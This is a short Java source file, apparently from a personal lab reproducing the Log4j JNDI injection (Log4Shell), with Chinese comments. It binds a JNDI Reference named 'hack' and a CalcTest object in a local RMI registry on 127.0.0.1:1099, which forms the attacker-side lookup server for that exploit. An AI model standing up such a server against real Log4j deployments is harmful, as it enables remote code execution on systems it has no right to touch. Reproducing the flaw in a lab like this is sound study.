package com.fhdone.paper2019.util.log4jhack;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 *
 */
public class RmiService2 {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099); //获取Registry
//       最后一个参数不指定的话，那么这个类的创建就在本地的jvm中，如果指定那么就在指定的服务器上进行创建
        Reference reference=new Reference("com.fhdone.paper2019.util.log4jhack.CalcTest",
            "com.fhdone.paper2019.util.log4jhack.CalcTest",null);
        ReferenceWrapper referenceWrapper=new ReferenceWrapper(reference);
        registry.bind("hack",referenceWrapper);
//        下面的调用直接获取到对象
        CalcTest calcTest=new CalcTest("RmiService");
        registry.bind("calc",calcTest);
        System.out.println("CalcTestService已经注册");

    }
}
